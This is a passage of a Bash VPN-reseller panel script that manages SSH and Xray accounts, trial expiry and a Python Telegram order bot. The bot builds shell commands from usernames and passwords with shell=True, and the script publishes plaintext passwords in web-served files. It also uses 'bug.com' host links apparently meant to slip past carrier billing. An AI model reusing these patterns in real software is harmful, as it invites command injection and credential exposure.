    if [[ $? -eq 0 ]] && [[ -s "$temp" ]]; then
        mv "$temp" "$XRAY_CONFIG"; fix_xray_permissions; systemctl restart xray 2>/dev/null; sleep 1
    else
        rm -f "$temp"; echo -e "  ${RED}✘ Failed!${NC}"; sleep 2; return
    fi

    mkdir -p "$AKUN_DIR"
    printf "UUID=%s\nQUOTA=1\nIPLIMIT=1\nEXPIRED=%s\nCREATED=%s\nTRIAL=1\n" \
        "$uuid" "$exp" "$created" > "$AKUN_DIR/${protocol}-${username}.txt"

    (
        sleep 3600
        local tmp2; tmp2=$(mktemp)
        jq --arg email "$username" \
           'del(.inbounds[].settings.clients[]? | select(.email == $email))' \
           "$XRAY_CONFIG" > "$tmp2" 2>/dev/null && \
           mv "$tmp2" "$XRAY_CONFIG" || rm -f "$tmp2"
        fix_xray_permissions; systemctl restart xray 2>/dev/null
        rm -f "$AKUN_DIR/${protocol}-${username}.txt"
        rm -f "$PUBLIC_HTML/${protocol}-${username}.txt"
    ) &
    disown $!

    # Generate links: TLS=443, NonTLS=80, gRPC=443
    local link_tls link_nontls link_grpc
    if [[ "$protocol" == "vmess" ]]; then
        local j_tls j_nontls j_grpc
        j_tls=$(printf '{"v":"2","ps":"%s","add":"bug.com","port":"443","id":"%s","aid":"0","net":"ws","path":"/vmess","type":"none","host":"%s","tls":"tls"}' "$username" "$uuid" "$DOMAIN")
        link_tls="vmess://$(printf '%s' "$j_tls" | base64 -w 0)"
        j_nontls=$(printf '{"v":"2","ps":"%s","add":"bug.com","port":"80","id":"%s","aid":"0","net":"ws","path":"/vmess","type":"none","host":"%s","tls":"none"}' "$username" "$uuid" "$DOMAIN")
        link_nontls="vmess://$(printf '%s' "$j_nontls" | base64 -w 0)"
        j_grpc=$(printf '{"v":"2","ps":"%s","add":"%s","port":"443","id":"%s","aid":"0","net":"grpc","path":"vmess-grpc","type":"none","host":"bug.com","tls":"tls"}' "$username" "$DOMAIN" "$uuid")
        link_grpc="vmess://$(printf '%s' "$j_grpc" | base64 -w 0)"
    elif [[ "$protocol" == "vless" ]]; then
        link_tls="vless://${uuid}@bug.com:443?path=%2Fvless&security=tls&encryption=none&host=${DOMAIN}&type=ws&sni=${DOMAIN}#${username}-TLS"
        link_nontls="vless://${uuid}@bug.com:80?path=%2Fvless&security=none&encryption=none&host=${DOMAIN}&type=ws#${username}-NonTLS"
        link_grpc="vless://${uuid}@${DOMAIN}:443?mode=gun&security=tls&encryption=none&type=grpc&serviceName=vless-grpc&sni=bug.com#${username}-gRPC"
    elif [[ "$protocol" == "trojan" ]]; then
        link_tls="trojan://${uuid}@bug.com:443?path=%2Ftrojan&security=tls&host=${DOMAIN}&type=ws&sni=${DOMAIN}#${username}-TLS"
        link_nontls="trojan://${uuid}@bug.com:80?path=%2Ftrojan&security=none&host=${DOMAIN}&type=ws#${username}-NonTLS"
        link_grpc="trojan://${uuid}@${DOMAIN}:443?mode=gun&security=tls&type=grpc&serviceName=trojan-grpc&sni=bug.com#${username}-gRPC"
    fi

    clear
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${WHITE}${BOLD}YOUZIN CRABZ TUNEL${NC} — ${YELLOW}Trial ${protocol^^} (1 Jam)${NC}"
    echo -e "  ${DIM}The Professor${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "Username" "$username"
    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "IP VPS"   "$ip_vps"
    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "Domain"   "$DOMAIN"
    printf "  ${WHITE}%-16s${NC} : ${CYAN}%s${NC}\n"  "UUID"     "$uuid"
    printf "  ${WHITE}%-16s${NC} : 1 GB\n" "Quota"
    printf "  ${WHITE}%-16s${NC} : 1 IP\n" "IP Limit"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    printf "  ${WHITE}%-16s${NC} : %s\n" "Port TLS"    "443"
    printf "  ${WHITE}%-16s${NC} : %s\n" "Port NonTLS" "80"
    printf "  ${WHITE}%-16s${NC} : %s\n" "Port gRPC"   "443"
    printf "  ${WHITE}%-16s${NC} : %s\n" "Path WS"     "/${protocol}"
    printf "  ${WHITE}%-16s${NC} : %s\n" "ServiceName" "${protocol}-grpc"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    printf "  ${YELLOW}Link TLS${NC} :\n  %s\n" "$link_tls"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    printf "  ${YELLOW}Link NonTLS${NC} :\n  %s\n" "$link_nontls"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    printf "  ${YELLOW}Link gRPC${NC} :\n  %s\n" "$link_grpc"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    printf "  ${WHITE}%-16s${NC} : ${YELLOW}1 Jam (Auto Delete)${NC}\n" "Aktif Selama"
    printf "  ${WHITE}%-16s${NC} : %s\n"  "Dibuat"   "$created"
    printf "  ${WHITE}%-16s${NC} : ${RED}%s${NC}\n" "Berakhir" "$exp"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    read -p "  Press any key to back..."
}

#================================================
# CREATE SSH
#================================================

create_ssh() {
    clear
    print_menu_header "CREATE SSH ACCOUNT"
    read -p "  Username      : " username
    [[ -z "$username" ]] && { echo -e "  ${RED}✘ Required!${NC}"; sleep 2; return; }
    if id "$username" &>/dev/null; then echo -e "  ${RED}✘ User sudah ada!${NC}"; sleep 2; return; fi
    read -p "  Password      : " password
    [[ -z "$password" ]] && { echo -e "  ${RED}✘ Required!${NC}"; sleep 2; return; }
    read -p "  Expired (days): " days
    [[ ! "$days" =~ ^[0-9]+$ ]] && { echo -e "  ${RED}✘ Invalid!${NC}"; sleep 2; return; }
    read -p "  Limit IP      : " iplimit
    [[ ! "$iplimit" =~ ^[0-9]+$ ]] && iplimit=1

    local exp exp_date created ip_vps
    exp=$(date -d "+${days} days" +"%d %b, %Y")
    exp_date=$(date -d "+${days} days" +"%Y-%m-%d")
    created=$(date +"%d %b, %Y")
    ip_vps=$(get_ip)

    useradd -M -s /bin/false -e "$exp_date" "$username" 2>/dev/null
    echo "${username}:${password}" | chpasswd

    mkdir -p "$AKUN_DIR"
    printf "USERNAME=%s\nPASSWORD=%s\nIPLIMIT=%s\nEXPIRED=%s\nCREATED=%s\n" \
        "$username" "$password" "$iplimit" "$exp" "$created" \
        > "$AKUN_DIR/ssh-${username}.txt"

    _save_ssh_file "SSH Account" "$username" "$password" "$ip_vps" "$days" "$created" "$exp"
    _print_ssh_result "SSH Account" "$username" "$password" "$ip_vps" "$days" "$created" "$exp"

    send_telegram_admin \
"✅ <b>New SSH Account - Youzin Crabz Tunel</b>
━━━━━━━━━━━━━━━━━━━━━━━━━
👤 Username   : <code>${username}</code>
🔑 Password   : <code>${password}</code>
🌐 Domain     : <code>${DOMAIN}</code>
🖥️ IP VPS     : <code>${ip_vps}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━
🔌 OpenSSH    : 22
🔌 Dropbear   : 222
🔌 SSL/TLS    : 443
🔌 BadVPN UDP : 7100-7300
━━━━━━━━━━━━━━━━━━━━━━━━━
📅 Dibuat     : ${created}
⏳ Berakhir   : ${exp}
🔗 Download   : http://${ip_vps}:81/ssh-${username}.txt
━━━━━━━━━━━━━━━━━━━━━━━━━
<i>Powered by The Professor</i>"

    read -p "  Press any key to back..."
}

#================================================
# SSH TRIAL
#================================================

create_ssh_trial() {
    local suffix; suffix=$(cat /proc/sys/kernel/random/uuid | tr -d '-' | head -c 4 | tr '[:lower:]' '[:upper:]')
    local username="Trial-${suffix}" password="1" ip_vps exp exp_date created
    ip_vps=$(get_ip)
    exp=$(date -d "+1 hour" +"%d %b, %Y %H:%M")
    exp_date=$(date -d "+1 days" +"%Y-%m-%d")
    created=$(date +"%d %b, %Y %H:%M")

    useradd -M -s /bin/false -e "$exp_date" "$username" 2>/dev/null
    echo "${username}:${password}" | chpasswd

    mkdir -p "$AKUN_DIR"
    printf "USERNAME=%s\nPASSWORD=%s\nIPLIMIT=1\nEXPIRED=%s\nCREATED=%s\nTRIAL=1\n" \
        "$username" "$password" "$exp" "$created" > "$AKUN_DIR/ssh-${username}.txt"

    (
        sleep 3600
        userdel -f "$username" 2>/dev/null
        rm -f "$AKUN_DIR/ssh-${username}.txt"
        rm -f "$PUBLIC_HTML/ssh-${username}.txt"
    ) &
    disown $!

    _save_ssh_file "Trial SSH (1 Jam)" "$username" "$password" "$ip_vps" "1 Jam (Auto Delete)" "$created" "$exp"
    _print_ssh_result "Trial SSH (1 Jam)" "$username" "$password" "$ip_vps" "1 Jam" "$created" "$exp"

    send_telegram_admin \
"🆓 <b>SSH Trial - Youzin Crabz Tunel</b>
━━━━━━━━━━━━━━━━━━━━━━━━━
👤 Username : <code>${username}</code>
🔑 Password : <code>${password}</code>
🌐 Domain   : <code>${DOMAIN}</code>
🖥️ IP VPS   : <code>${ip_vps}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ Aktif    : 1 Jam (Auto Delete)
📅 Expired  : ${exp}
━━━━━━━━━━━━━━━━━━━━━━━━━
<i>Powered by The Professor</i>"

    read -p "  Press any key to back..."
}

#================================================
# SSH HELPERS
#================================================

_save_ssh_file() {
    local title="$1" username="$2" password="$3" ip_vps="$4" days="$5" created="$6" exp="$7"
    mkdir -p "$PUBLIC_HTML"
    cat > "$PUBLIC_HTML/ssh-${username}.txt" << SSHFILE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  YOUZIN CRABZ TUNEL - ${title}
  The Professor
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Username         : ${username}
 Password         : ${password}
 IP/Host          : ${ip_vps}
 Domain SSH       : ${DOMAIN}
 OpenSSH          : 22
 Dropbear         : 222
 Port SSH UDP     : 1-65535
 SSL/TLS          : 443
 SSH Ws Non SSL   : 80
 SSH Ws SSL       : 443
 BadVPN UDPGW     : 7100,7200,7300
 Format Hc        : ${DOMAIN}:80@${username}:${password}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Save Link        : http://${ip_vps}:81/ssh-${username}.txt
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Payload          : GET / HTTP/1.1[crlf]Host: ${DOMAIN}[crlf]Upgrade: ws[crlf][crlf]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Aktif Selama     : ${days}
 Dibuat Pada      : ${created}
 Berakhir Pada    : ${exp}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SSHFILE
}

_print_ssh_result() {
    local title="$1" username="$2" password="$3" ip_vps="$4" days="$5" created="$6" exp="$7"
    clear
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${WHITE}${BOLD}YOUZIN CRABZ TUNEL${NC} — ${YELLOW}${title}${NC}"
    echo -e "  ${DIM}The Professor${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "Username"       "$username"
    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "Password"       "$password"
    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "IP/Host"        "$ip_vps"
    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "Domain SSH"     "$DOMAIN"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    printf "  ${WHITE}%-16s${NC} : %s\n" "OpenSSH"        "22"
    printf "  ${WHITE}%-16s${NC} : %s\n" "Dropbear"       "222"
    printf "  ${WHITE}%-16s${NC} : %s\n" "Port SSH UDP"   "1-65535"
    printf "  ${WHITE}%-16s${NC} : %s\n" "SSL/TLS"        "443"
    printf "  ${WHITE}%-16s${NC} : %s\n" "SSH Ws Non SSL" "80"
    printf "  ${WHITE}%-16s${NC} : %s\n" "SSH Ws SSL"     "443"
    printf "  ${WHITE}%-16s${NC} : %s\n" "BadVPN UDPGW"   "7100,7200,7300"
    printf "  ${WHITE}%-16s${NC} : %s:80@%s:%s\n" "Format Hc" "$DOMAIN" "$username" "$password"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    printf "  ${WHITE}%-16s${NC} : http://%s:81/ssh-%s.txt\n" "Save Link" "$ip_vps" "$username"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    printf "  ${WHITE}%-16s${NC} : GET / HTTP/1.1[crlf]Host: %s[crlf]Upgrade: ws[crlf][crlf]\n" "Payload" "$DOMAIN"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    printf "  ${WHITE}%-16s${NC} : ${YELLOW}%s${NC}\n"    "Aktif Selama"  "$days"
    printf "  ${WHITE}%-16s${NC} : %s\n"                   "Dibuat Pada"   "$created"
    printf "  ${WHITE}%-16s${NC} : ${RED}%s${NC}\n"        "Berakhir Pada" "$exp"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    # QR Code jika qrencode tersedia
    if command -v qrencode >/dev/null 2>&1; then
        echo -e "  ${CYAN}[q]${NC} Tampilkan QR Code TLS  ${CYAN}[Enter]${NC} Lanjut"
        read -p "  " qr_choice
        if [[ "$qr_choice" == "q" || "$qr_choice" == "Q" ]]; then
            clear
            echo -e "  ${YELLOW}QR Code — ${protocol^^} TLS Link:${NC}"
            echo ""
            qrencode -t ANSIUTF8 "$link_tls" 2>/dev/null || echo -e "  ${RED}QR gagal${NC}"
            echo ""; read -p "  Tekan Enter..."; clear
        fi
    fi
}

#================================================
# INSTALL QRENCODE (dipanggil saat buat akun pertama)
#================================================

_ensure_qrencode() {
    command -v qrencode >/dev/null 2>&1 && return 0
    apt-get install -y qrencode >/dev/null 2>&1 && return 0
    return 1
}

delete_account() {
    local protocol="$1"
    clear; print_menu_header "DELETE ${protocol^^}"
    shopt -s nullglob
    local files=("$AKUN_DIR"/${protocol}-*.txt)
    shopt -u nullglob
    if [[ ${#files[@]} -eq 0 ]]; then echo -e "  ${RED}No accounts!${NC}"; sleep 2; return; fi
    for f in "${files[@]}"; do
        local n e
        n=$(basename "$f" .txt | sed "s/${protocol}-//")
        e=$(grep "EXPIRED" "$f" 2>/dev/null | cut -d= -f2-)
        echo -e "  ${CYAN}▸${NC} $n ${YELLOW}($e)${NC}"
    done
    echo ""
    read -p "  Username to delete: " username
    [[ -z "$username" ]] && return
    if [[ -n "$username" ]]; then
        local tmp; tmp=$(mktemp)
        jq --arg email "$username" \
           'del(.inbounds[].settings.clients[]? | select(.email == $email))' \
           "$XRAY_CONFIG" > "$tmp" 2>/dev/null
        if jq empty "$tmp" 2>/dev/null && [[ -s "$tmp" ]]; then
            mv "$tmp" "$XRAY_CONFIG"
        else
            rm -f "$tmp"
        fi
        fix_xray_permissions
        if xray -test -config "$XRAY_CONFIG" >/dev/null 2>&1; then
            systemctl restart xray 2>/dev/null
        fi
        rm -f "$AKUN_DIR/${protocol}-${username}.txt"
        rm -f "$PUBLIC_HTML/${protocol}-${username}.txt"
        [[ "$protocol" == "ssh" ]] && userdel -f "$username" 2>/dev/null
        echo -e "  ${GREEN}✔ Deleted: ${username}${NC}"
        sleep 2
    fi
}

renew_account() {
    local protocol="$1"
    clear; print_menu_header "RENEW ${protocol^^}"
    shopt -s nullglob
    local files=("$AKUN_DIR"/${protocol}-*.txt)
    shopt -u nullglob
    if [[ ${#files[@]} -eq 0 ]]; then echo -e "  ${RED}No accounts!${NC}"; sleep 2; return; fi
    for f in "${files[@]}"; do
        local n e
        n=$(basename "$f" .txt | sed "s/${protocol}-//")
        e=$(grep "EXPIRED" "$f" 2>/dev/null | cut -d= -f2-)
        echo -e "  ${CYAN}▸${NC} $n ${YELLOW}($e)${NC}"
    done
    echo ""
    read -p "  Username to renew: " username
    [[ -z "$username" ]] && return
    [[ ! -f "$AKUN_DIR/${protocol}-${username}.txt" ]] && { echo -e "  ${RED}✘ Not found!${NC}"; sleep 2; return; }
    read -p "  Add days: " days
    [[ ! "$days" =~ ^[0-9]+$ ]] && { echo -e "  ${RED}✘ Invalid!${NC}"; sleep 2; return; }
    local new_exp new_exp_date
    new_exp=$(date -d "+${days} days" +"%d %b, %Y")
    new_exp_date=$(date -d "+${days} days" +"%Y-%m-%d")
    sed -i "s/EXPIRED=.*/EXPIRED=${new_exp}/" "$AKUN_DIR/${protocol}-${username}.txt"
    [[ "$protocol" == "ssh" ]] && chage -E "$new_exp_date" "$username" 2>/dev/null
    echo -e "  ${GREEN}✔ Renewed! Exp: ${new_exp}${NC}"
    sleep 3
}

list_accounts() {
    local protocol="$1"
    clear
    local W; W=$(get_width)
    shopt -s nullglob
    local files=("$AKUN_DIR"/${protocol}-*.txt)
    shopt -u nullglob
    _box_top $W
    _box_center $W "${YELLOW}${BOLD}${protocol^^} ACCOUNT LIST${NC}"
    _box_divider $W
    if [[ ${#files[@]} -eq 0 ]]; then
        _box_center $W "${RED}Tidak ada akun!${NC}"
        _box_bottom $W
        echo ""; sleep 2; return
    fi
    _box_row $W "USERNAME" "EXPIRED / QUOTA / TYPE"
    _box_divider $W
    for f in "${files[@]}"; do
        local uname exp quota trial ttype
        uname=$(basename "$f" .txt | sed "s/${protocol}-//")
        exp=$(grep "EXPIRED" "$f" 2>/dev/null | cut -d= -f2-)
        quota=$(grep "QUOTA" "$f" 2>/dev/null | cut -d= -f2)
        trial=$(grep "TRIAL" "$f" 2>/dev/null | cut -d= -f2)
        ttype="Member"; [[ "$trial" == "1" ]] && ttype="Trial"
        _box_row $W "${uname}" "${exp}  ${quota:-?}GB  ${ttype}"
    done
    _box_divider $W
    _box_left $W "Total: ${GREEN}${#files[@]}${NC} akun"
    _box_bottom $W
    echo ""
    read -p "  Tekan Enter untuk kembali..."
}

check_user_login() {
    local protocol="$1"
    clear; print_menu_header "ACTIVE ${protocol^^} LOGINS"
    if [[ "$protocol" == "ssh" ]]; then
        echo -e "  ${WHITE}Active SSH sessions:${NC}"
        who 2>/dev/null || echo "  None"
        echo ""
        echo -e "  ${WHITE}Login count:${NC}"
        who 2>/dev/null | awk '{print $1}' | sort | uniq -c | sort -rn
    else
        echo -e "  ${WHITE}Xray ${protocol^^} log:${NC}"
        if [[ -f /var/log/xray/access.log ]]; then
            grep -i "$protocol" /var/log/xray/access.log 2>/dev/null | tail -20 || echo "  No data"
        else
            echo "  No log"
        fi
    fi
    echo ""
    read -p "  Press any key to back..."
}

#================================================
# SETUP TELEGRAM BOT (vpn-bot)
#================================================

setup_telegram_bot() {
    clear
    print_menu_header "SETUP TELEGRAM BOT"
    echo -e "  ${YELLOW}Cara mendapatkan Bot Token:${NC}"
    echo -e "  1. Buka Telegram cari ${WHITE}@BotFather${NC}"
    echo -e "  2. Ketik /newbot ikuti instruksi"
    echo -e "  3. Copy TOKEN yang diberikan"
    echo ""
    echo -e "  ${YELLOW}Cara mendapatkan Chat ID:${NC}"
    echo -e "  1. Cari ${WHITE}@userinfobot${NC} di Telegram"
    echo -e "  2. Ketik /start lihat ID kamu"
    echo ""
    read -p "  Bot Token     : " bot_token
    [[ -z "$bot_token" ]] && { echo -e "  ${RED}✘ Token required!${NC}"; sleep 2; return; }
    read -p "  Admin Chat ID : " admin_id
    [[ -z "$admin_id" ]] && { echo -e "  ${RED}✘ Chat ID required!${NC}"; sleep 2; return; }
    echo -e "  ${CYAN}Testing token...${NC}"
    local test_result bot_name
    test_result=$(curl -s --max-time 10 "https://api.telegram.org/bot${bot_token}/getMe")
    if ! echo "$test_result" | grep -q '"ok":true'; then
        echo -e "  ${RED}✘ Token tidak valid!${NC}"; sleep 2; return
    fi
    bot_name=$(echo "$test_result" | python3 -c "
import sys,json
d=json.load(sys.stdin)
print(d['result']['username'])
" 2>/dev/null)
    echo -e "  ${GREEN}✔ Bot valid! @${bot_name}${NC}"
    echo ""
    read -p "  Nama Pemilik Rekening : " rek_name
    read -p "  Nomor Rek/Dana/GoPay  : " rek_number
    read -p "  Bank / E-Wallet       : " rek_bank
    read -p "  Harga per Bulan (Rp)  : " harga
    [[ ! "$harga" =~ ^[0-9]+$ ]] && harga=10000

    echo "$bot_token" > "$BOT_TOKEN_FILE"
    echo "$admin_id"  > "$CHAT_ID_FILE"
    chmod 600 "$BOT_TOKEN_FILE" "$CHAT_ID_FILE"

    cat > "$PAYMENT_FILE" << PAYEOF
REK_NAME=${rek_name}
REK_NUMBER=${rek_number}
REK_BANK=${rek_bank}
HARGA=${harga}
PAYEOF
    chmod 600 "$PAYMENT_FILE"

    _install_bot_service
    sleep 2
    if systemctl is-active --quiet vpn-bot; then
        echo -e "  ${GREEN}✔ Bot aktif! @${bot_name}${NC}"
        curl -s -X POST \
            "https://api.telegram.org/bot${bot_token}/sendMessage" \
            -d chat_id="$admin_id" \
            -d text="✅ Youzin Crabz Tunel Bot Aktif!
Domain: ${DOMAIN}
Powered by The Professor" \
            -d parse_mode="HTML" \
            --max-time 10 >/dev/null 2>&1
    else
        echo -e "  ${RED}✘ Bot gagal start!${NC}"
        journalctl -u vpn-bot -n 10 --no-pager
    fi
    echo ""
    read -p "  Press any key to back..."
}

#================================================
# INSTALL BOT SERVICE (vpn-bot)
# Link gRPC diupdate ke port 443
#================================================

_install_bot_service() {
    mkdir -p /root/bot "$ORDER_DIR"
    pip_install requests

    cat > /root/bot/bot.py << 'BOTEOF'
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os, json, time, subprocess
import threading
from datetime import datetime, timedelta

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    os.system('pip3 install requests --break-system-packages -q')
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry

TOKEN     = open('/root/.bot_token').read().strip()
ADMIN_ID  = int(open('/root/.chat_id').read().strip())
DOMAIN    = open('/root/domain').read().strip() if os.path.exists('/root/domain') else 'N/A'
ORDER_DIR = '/root/orders'
AKUN_DIR  = '/root/akun'
HTML_DIR  = '/var/www/html'
API       = f'https://api.telegram.org/bot{TOKEN}'

os.makedirs(ORDER_DIR, exist_ok=True)
os.makedirs(AKUN_DIR,  exist_ok=True)
os.makedirs(HTML_DIR,  exist_ok=True)

user_state = {}
state_lock = threading.Lock()

def make_session():
    s = requests.Session()
    retry = Retry(total=2, backoff_factor=0.3, status_forcelist=[500,502,503,504])
    adapter = HTTPAdapter(max_retries=retry, pool_connections=20, pool_maxsize=50)
    s.mount('https://', adapter)
    s.mount('http://', adapter)
    return s

SESSION = make_session()

def get_payment():
    info = {'REK_NAME':'N/A','REK_NUMBER':'N/A','REK_BANK':'N/A','HARGA':'10000'}
    try:
        with open('/root/.payment_info') as f:
            for line in f:
                line = line.strip()
                if '=' in line:
                    k,v = line.split('=',1)
                    info[k.strip()] = v.strip()
    except: pass
    return info

def api_post(method, data, timeout=6):
    try:
        r = SESSION.post(f'{API}/{method}', data=data, timeout=timeout)
        return r.json()
    except Exception as e:
        print(f'API {method}: {e}', flush=True)
        return {}

def send(chat_id, text, markup=None, parse_mode='HTML'):
    data = {'chat_id':chat_id,'text':text,'parse_mode':parse_mode}
    if markup: data['reply_markup'] = json.dumps(markup)
    return api_post('sendMessage', data)

def answer_cb(cb_id, text='', alert=False):
    api_post('answerCallbackQuery', {'callback_query_id':cb_id,'text':text,'show_alert':alert})

def get_updates(offset=0):
    try:
        r = SESSION.get(f'{API}/getUpdates', params={'offset':offset,'timeout':15,'limit':100}, timeout=20)
        return r.json().get('result', [])
    except: return []

def kb_main():
    return {'keyboard':[
        ['🆓 Trial Gratis','🛒 Order VPN'],
        ['📋 Cek Akun Saya','ℹ️ Info Server'],
        ['❓ Bantuan','📞 Hubungi Admin']
    ],'resize_keyboard':True,'one_time_keyboard':False}

def kb_trial():
    return {'inline_keyboard':[
        [{'text':'🔵 SSH','callback_data':'trial_ssh'},{'text':'🟢 VMess','callback_data':'trial_vmess'}],
        [{'text':'🟡 VLess','callback_data':'trial_vless'},{'text':'🔴 Trojan','callback_data':'trial_trojan'}],
        [{'text':'◀️ Kembali','callback_data':'back_main'}]
    ]}

def kb_order():
    return {'inline_keyboard':[
        [{'text':'🔵 SSH','callback_data':'order_ssh'},{'text':'🟢 VMess','callback_data':'order_vmess'}],
        [{'text':'🟡 VLess','callback_data':'order_vless'},{'text':'🔴 Trojan','callback_data':'order_trojan'}],
        [{'text':'◀️ Kembali','callback_data':'back_main'}]
    ]}

def kb_confirm(order_id):
    return {'inline_keyboard':[[
        {'text':'✅ Konfirmasi','callback_data':f'confirm_{order_id}'},
        {'text':'❌ Tolak','callback_data':f'reject_{order_id}'}
    ]]}

def kb_cancel():
    return {'inline_keyboard':[[{'text':'❌ Batalkan','callback_data':'cancel_order'}]]}

def get_ip():
    for url in ['https://ifconfig.me','https://ipinfo.io/ip','https://api.ipify.org']:
        try:
            r = SESSION.get(url, timeout=3)
            if r.status_code == 200: return r.text.strip()
        except: pass
    return 'N/A'

def run_cmd(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=90)
        return r.stdout.strip()
    except Exception as e:
        print(f'CMD: {e}', flush=True)
        return ''

def save_order(oid, data):
    with open(f'{ORDER_DIR}/{oid}.json','w') as f: json.dump(data, f, indent=2)

def load_order(oid):
    p = f'{ORDER_DIR}/{oid}.json'
    if not os.path.exists(p): return None
    with open(p) as f: return json.load(f)

def get_pending():
    orders = []
    if not os.path.exists(ORDER_DIR): return orders
    for fn in os.listdir(ORDER_DIR):
        if not fn.endswith('.json'): continue
        try:
            with open(f'{ORDER_DIR}/{fn}') as f: d = json.load(f)
            if d.get('status') == 'pending': orders.append(d)
        except: pass
    return orders

def make_ssh(username, password, days=30):
    exp_date = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')
    exp_str  = (datetime.now() + timedelta(days=days)).strftime('%d %b, %Y')
    created  = datetime.now().strftime('%d %b, %Y')
    run_cmd(f'useradd -M -s /bin/false -e {exp_date} {username} 2>/dev/null')
    run_cmd(f'echo "{username}:{password}" | chpasswd')
    with open(f'{AKUN_DIR}/ssh-{username}.txt','w') as f:
        f.write(f'USERNAME={username}\nPASSWORD={password}\nIPLIMIT=1\nEXPIRED={exp_str}\nCREATED={created}\n')
    ip = get_ip()
    with open(f'{HTML_DIR}/ssh-{username}.txt','w') as f:
        f.write(f'YOUZIN CRABZ TUNEL - SSH\nUsername: {username}\nPassword: {password}\nExpired: {exp_str}\n')
    return exp_str, ip

def make_xray(protocol, username, days=30, quota=100):
    import uuid as uuidlib, base64
    uid      = str(uuidlib.uuid4())
    exp_str  = (datetime.now() + timedelta(days=days)).strftime('%d %b, %Y')
    created  = datetime.now().strftime('%d %b, %Y')
    cfg      = '/usr/local/etc/xray/config.json'
    if protocol == 'vmess':
        cmd = f'jq --arg uuid "{uid}" --arg email "{username}" \'(.inbounds[] | select(.tag | startswith("vmess")).settings.clients) += [{{"id":$uuid,"email":$email,"alterId":0}}]\' {cfg} > /tmp/xr.json && mv /tmp/xr.json {cfg}'
    elif protocol == 'vless':
        cmd = f'jq --arg uuid "{uid}" --arg email "{username}" \'(.inbounds[] | select(.tag | startswith("vless")).settings.clients) += [{{"id":$uuid,"email":$email}}]\' {cfg} > /tmp/xr.json && mv /tmp/xr.json {cfg}'
    elif protocol == 'trojan':
        cmd = f'jq --arg password "{uid}" --arg email "{username}" \'(.inbounds[] | select(.tag | startswith("trojan")).settings.clients) += [{{"password":$password,"email":$email}}]\' {cfg} > /tmp/xr.json && mv /tmp/xr.json {cfg}'
    run_cmd(cmd)
    run_cmd(f'chmod 644 {cfg}')
    run_cmd('systemctl restart xray')
    with open(f'{AKUN_DIR}/{protocol}-{username}.txt','w') as f:
        f.write(f'UUID={uid}\nQUOTA={quota}\nIPLIMIT=1\nEXPIRED={exp_str}\nCREATED={created}\n')
    ip = get_ip()
    # TLS=443, NonTLS=80, gRPC=443
    if protocol == 'vmess':
        j_tls = f'{{"v":"2","ps":"{username}","add":"bug.com","port":"443","id":"{uid}","aid":"0","net":"ws","path":"/{protocol}","type":"none","host":"{DOMAIN}","tls":"tls"}}'
        link_tls  = "vmess://" + base64.b64encode(j_tls.encode()).decode()
